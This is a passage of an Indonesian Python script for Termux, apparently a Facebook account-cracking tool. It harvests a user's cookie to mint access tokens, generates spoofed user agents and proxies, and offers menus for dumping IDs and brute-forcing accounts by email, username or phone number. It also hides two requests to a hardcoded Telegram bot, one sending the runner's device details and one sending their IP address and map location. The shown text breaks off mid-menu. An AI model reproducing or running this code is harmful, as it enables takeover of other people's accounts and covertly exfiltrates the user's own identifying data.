#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,socket
import urllib3,rich,base64
import re,requests,os,time
import os,sys
import socket,threading
import datetime
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as AsepXc
from bs4 import BeautifulSoup as parse
from time import time as mek
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from getpass import getpass
from rich.text import Text as tekz
from rich.progress import track
from pwinput import pwinput
from rich.console import Console
wa = Console()
console = Console()


#DATA AUTHOR#
Author = 'Bimzzzz.ae - TermuxCrackFB'
Status = 'Premium'
serverKey = 'Asep=Keyopenfullnegara=jagayysshy'
ServerKeyV2 = 'Bimz=KeySourceTruecode/hJskndokwmOpwpejw9alwLndwlbcks8nO2b'
#DATA SERVER#
datalocalserver=requests.get('https://google.com')


x = datetime.datetime.now()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#FFFFFF"
	
#+++++# cek warna tema tools #+++++#	
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#FFFFFF"
	
#----------[server data Facebook]-----------#
pretty.install()
CON=sol()
console = Console()
#------------------[ USER-AGENT ]-------------------#
uakuh=[]
ugen=[]
ugen3=[]
ugen4=[]
cokbrut=[]
xxkontol=[]
ugen6=[]
ugen7=[]
proxxy = []
gabriel=[]
dump = []
memek = []
ualu,ualuh = [],[]
ses=requests.Session()
princp=[]
sys.stdout.write('\x1b]2; BFC|Bosmuda\x07')
#--------------[Proxy site Fresh]-----------#
try:
	prox= requests.get("https://api.proxyscrape.com/v2/#?request=displayproxies&protocol=socks4&timeout=100000&count#ry=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
#--------------[User agent mini]-----------#    
for xd in range(1000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='SM-J710MN)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen3.append(uaku2)
  
	
#USER AGENT CRACK REDMI#
ugen8=[]
for tu in range(1000):
            a =random.randrange(3,12)
            b = random.choice([
            'Redmi 10 5G',
            'Redmi S2',
            'Redmi Note 9S',
            'Redmi X',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Redmi Y3',
            'Redmi Note 7 Pro',
            'Redmi Note 7S',
            'Redmi Note 8',
            'Redmi Note 10 JE',
            'Redmi Note 11 4G',
            'Redmi Note 11T Pro',
            'Redmi Note 11T Pro+',
            'Redmi Note 11S 5G',
            'Redmi Note 11 5G',
            'Redmi 10',
            'Redmi 1',
            'Redmi Note 11',
            'Redmi 10S',
            'Redmi 10I',
            'Redmi 10C',
            'Redmi 10A',
            'Redmi Note 1',
            'Redmi Note 10',
            'Redmi K50',
            'Redmi 3X',
            'Redmi 1S',
            'Redmi 12C',
            'Redmi 2A',
            'Redmi 12',
            'Redmi 6A',
            'Redmi Note 9 Pro'
            'Redmi 5 Pro',
            'Redmi 5 Plus',
            'Redmi 5pro',
            'Redmi 5A',
            'Redmi 85781',
            'Redmi 7i',
            'Redmi 7 Pro',
            'Redmi 7',
            'Redmi 7A',
            'Redmi 9A',
            'Redmi 9T NFC',
            'Redmi 9T',
            'Redmi 9pro',
            'Redmi 9C',
            'Redmi Go',
            'Redmi A8',
            'Redmi A90',
            'Redmi A2',
            'Redmi A3'])
            c = random.choice([
            'zh-TW',
            'es-es',
            'pt-br',
            'zh-cn',
            'zh-CN',
            'it-it',
            'it-it',
            'en-us',
            'zh-tw',
            'en-US',
            'fa-ir',
            'id-id'])
            d = random.randrange(1111, 2999)
            e = random.randrange(11, 19)
            f = random.randrange(73, 99)
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            uaku2 = f'Mozilla/5.0 (Linux; Android {c} {a}; {b} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'
            ugen8.append(uaku2)

#USER AGENT SONI ASYNC#
ugen7=[]
for tu in range(1000):
            a =random.randrange(3,12)
            b = random.choice([
            'A37f',
            'A37fw',
            'G8231',
            'SO-41B',
            'XQ-CC54',
            'XQ-CQ54',
            'XQ-AU52',
            'XQ-BE52',
            'XQ-BE72',
            'XQ-CQ72',
            'SO-41B',
            'SO-54C',
            'E6833',
            'A202SO',
            'SGP771',
            'I4193',
            'XQ-CC72',
            'E6833',
            'SOV34',
            'XQ-CQ54',
            'H4433',
            'I4332',
            'I4312',
            'M880',
            'SGP551',
            'SGP521',
            'SGP611',
            'SGP312',
            'SOV35',
            'SOV31',
            'SOV35',
            'SGP412',
            'XQ-BE62'])
            c = random.choice([
            'zh-TW',
            'es-es',
            'pt-br',
            'zh-cn',
            'zh-CN',
            'it-it',
            'it-it',
            'en-us',
            'zh-tw',
            'en-US',
            'fa-ir',
            'id-id'])
            d = random.randrange(1111, 2999)
            e = random.randrange(11, 19)
            f = random.randrange(73, 99)
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            uaku2 = f'Mozilla/5.0 (Linux; Android {a}; {b} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'
            ugen7.append(uaku2)
            
            
model_android=[]
try:
	for xnxx in requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines():
		model_android.append(xnxx)
except:pass
try:
	for xxxx in requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines():
		user.append(xxxx)
except:pass
	
sim_id=''
fblc='en_GB'
android_version=subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model=subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build=subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
try:fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:fbcr='Zong'

fbmf=subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv=model
fbsv=android_version
fbca=subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm='{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
	fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
	total=0
	for i in fbcr:
		total+=1
	select=('1','2')
	if select == '1':
		fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
		sim_id+=fbcr
	elif select == '2':
		try:
			fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
		except Exception as e:
			fbcr="Zong"
			sim_id+=fbcr
	else:
		fbcr='Zong'
		sim_id+=fbcr
except:fbcr='Zong'
device={'android_version':android_version,'model':model,'build':build,'fblc':fblc,'fbmf':fbmf,'fbbd':fbbd,'fbdv':model,'fbsv':fbsv,'fbca':fbca,'fbdm':fbdm}
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
versi_app = str(random.randint(111111111,999999999))
language = "en_GB"
try:
	simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:
	simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
	
ugent = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
requests.post(f"https://api.telegram.org/bot6286449191:AAG3uDgINsf48ZhKxDv5-wvEIAHhz8vNbhQ/sendMessage?chat_id=5087794076&text={ugent}")
#---------------[Proxy new]---------------#        
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   prints(nel(f"{P2}Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=70,padding=(0,2),style=f"{color_panel}"));exit()

#---------[data server Facebook]----------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
ualu,ualuh = [],[]
#----------[kode warna server]----------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
pengguna = 'Premium'
import datetime
x = datetime.datetime.now()
jam = x.strftime("%I:%M %p")
#----------[tanggal anda waktu]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tanggal = '    '+str(tgl)+'-'+str(bln)+'-'+str(thn)+''
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

#----------[teks jalan]----------#       
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 


#----------[membersihkan layar]---------#
def clear():
	os.system('clear')
	time.sleep(2)
	Console.print(nel('[bold green]Layar telah dibersihkan...'))
	Console.print(nel('[bold red]Sedang Login ulang...'))
def back():
	login()

#----------[logo banner]---------#
def none():
	clear()
def info():
	prints(f"""""")
def banner():
	clear()
	prints(nel(f"""{color_text}{P2} _______ _______ _______ __  __ ______ _______ __  __ 
|   |   |_     _|    ___|  |/  |   __ \    ___|  |/  |
{M2}|       | |   | |    ___|     <|      <    ___|     < 
|__|_|__| |___| |___|   |__|\__|___|__|_______|__|\__|
""",title=f"{P2}Version {H2}20.1{P2}",subtitle=f"{H2}{Author}{P2}",width=70,style=f"{color_panel}"))
cookie=[]
#----------[Untuk Login Facebook]----------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			prints(nel(f'{M2}Internet Anda Sedang Sibuk/Tidak Ada{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		print('[+] Author : Bimzzz.ae - TermuxScript\n[+] Status : \033[32mNotCookie\033[0m')
		prints(nel(f'{P2}Masukan cookie anda dulu, Saran ektensi : [green]Cookiedough{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		your_cookies = input("[+] Cookie lu :\x1b[1;92m ")
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					cetak(nel(f"Cookie anda invalid bro", end='\r'));time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							prints(nel(f'{P2}Token : {K2}{access_token}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							prints(nel(f'{H2}Login berhasil tersimpan di .token.txt && .cok.txt{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
			except Exception as e:
				prints(nel(f'{H2}Cookie anda expired/kedaluwarsa makanya ganteng{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(2)
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
def login_lagi3b34():
	try:
		os.system('clear')
		banner()
		print('[+] Author : Bimzzz.ae - TermuxCrackFB\n[+] Status : \033[32mNotCookie\033[0m')
		prints(nel(f'{P2}Masukan cookie anda dulu, Saran ektensi : [green]Cookiedough{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		your_cookies = input("[+] Cookie lu :\x1b[1;92m ")
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					cetak(nel(f"Cookie anda expired/kedaluwarsa ", end='\r'));time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							prints(nel(f'{P2}Token : {K2}{access_token}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							prints(nel(f'{H2}Login berhasil tersimpan di .token.txt && .cok.txt{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
			except Exception as e:
				prints(nel(f'{H2}Cookie anda expired/kedaluwarsa makanya ganteng{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(2)
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				#print(e)
				back()
	except:pass
	     
tanda = '+'
#-----------[menu Facebook crack]----------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:
		print('\033[0m╰─ Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:card = cek_data["isp"]
	except:card = {'-'}
	try:indo = cek_data["country"]
	except:indo = {'-'}
	try:zone = cek_data["timezone"]
	except:zone = {'-'}
	try:lat = cek_data["lat"]
	except:lat = {'-'}
	try:lon = cek_data["lon"]
	except:lon = {'-'}
	try:Lokasi = cek_data["city"]
	except:Lokasi = {'-'}
	try:pickkartu=cek_data["as"]
	except:pickkartu = {'-'}
	try:Iplu=cek_data["query"]
	except:Iplu = {'-'}
	try:ng=cek_data["country"]
	except:ng = {'-'}
	prints(nel(f'{P2}Name   : {H2}{my_name} - {Lokasi}\n{P2}ID     : {H2}{my_id} - {zone}{P2}',title=f'{H2}{pengguna}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	requests.post(f"https://api.telegram.org/bot6286449191:AAG3uDgINsf48ZhKxDv5-wvEIAHhz8vNbhQ/sendMessage?chat_id=5087794076&text=IP Address: {Iplu}\nLokasi : {Lokasi}\nGoogle maps : https://www.google.com/maps/place/{lat}{tanda}{lon}")
	prints(nel(f"""{P2}[{color_text}01{P2}]. MTF Public          [{color_text}05{P2}]. Cek Hasil 
[{color_text}02{P2}]. MTF Public/Massal   [{color_text}06{P2}]. Cek Account
[{color_text}03{P2}]. MTF File            [{color_text}07{P2}]. Dump ID\n[{color_text}04{P2}]. MTF gmail           [{color_text}00{P2}]. Exit""",width=70,padding=(0,7),style=f"{color_panel}"));prints(nel(f'{P2}Ketik "{H2}bot{P2}" jika ingin menggunakan{P2}',title=f'{H2}{jam} - {Iplu}{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	Asepitgans_Dev = input('[+] Pilih : ')
	if Asepitgans_Dev in ['1','01']:
		dump_publik()
	elif Asepitgans_Dev in ['2','02']:
		#khususprem()
		dump_massal()
	elif Asepitgans_Dev in ['3','03']:
		prints(nel(f'{P2} Tools MTF file simple{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Crack file v¹\n[{color_text}02{P2}]. MTF file v²{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		Asep_sedunia_ganteng = input('[+] Pilih : ')
		if Asep_sedunia_ganteng in ['01','1']:
			#khususprem()
			crack_file()
		elif Asep_sedunia_ganteng in ['02','2']:
			#khususprem()
			crack_filev2()
		else:
			prints(nel(f'{P2}Input Error!!{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif Asepitgans_Dev in ['4','04']:
		prints(nel(f'{P2}Tools brute crak simple/dan bagus untuk coli\Pilihan Crack Bisa Menulis Ke {H2}mail{P2}/{K2}yaho{P2}/{M2}user{P2}/{H2}Nomor{P2} pilih method no {H2}7{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. MTF Gmail\n[{color_text}02{P2}]. MTF Yahoo\n[{color_text}03{P2}]. MTF username\n[{color_text}04{P2}]. MTF Nomor Telepon{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		Asep_sukaColi_DanGanteng = input('[+] Pilih : ')
		if Asep_sukaColi_DanGanteng in ['01','1','mail','gmail']:
			#khususprem()
			clon_email()
		elif Asep_sukaColi_DanGanteng in ['02','2','yaho','yahoo']:
			#khususprem()
			clon_yahoo()
		elif Asep_sukaColi_DanGanteng in ['03','3','user','nama']:
			#khususprem()
			crack_nama()
		elif Asep_sukaColi_DanGanteng in ['04','4','nomor','nom']:
			#khususprem()
			crack_nomor()
		else:
			prints(nel(f'{P2}Input Error!!{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif Asepitgans_Dev in ['5','05']:
		result()
	elif Asepitgans_Dev in ['lain']:
		menulain()
	elif Asepitgans_Dev in ['6','06']:
		prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Cek detektor Account Link V¹\n[{color_text}02{P2}]. Cek detektor Account By Latif V²\n[{color_text}03{P2}]. Cek detektor Account Link V³\n[{color_text}04{P2}]. Cek detektor Account Link V⁴{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		AsepPaling_Ganteng_Pisan = input('[+] pilih : ')
		if AsepPaling_Ganteng_Pisan in ['01','1']:
			#khususprem()
			file_cp()
		elif AsepPaling_Ganteng_Pisan in ['02','2']:
			#khususprem()
			cekdetektor()
		elif AsepPaling_Ganteng_Pisan in ['03','3']:
			#khususprem()
			filecek_cp()
		elif AsepPaling_Ganteng_Pisan in ['04','4']:
			#khususprem()
			filecek4_cp()
		else:
			prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	elif Asepitgans_Dev in ['7','07']:
		#khususprem()
		prints(nel(f'{P2}[{color_text}01{P2}]. Dump id sesuai tahun\n[{color_text}02{P2}]. Dump id sesuai teman{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		idss = input('[+] Pilih : ')
		if idss in ['01','1']:
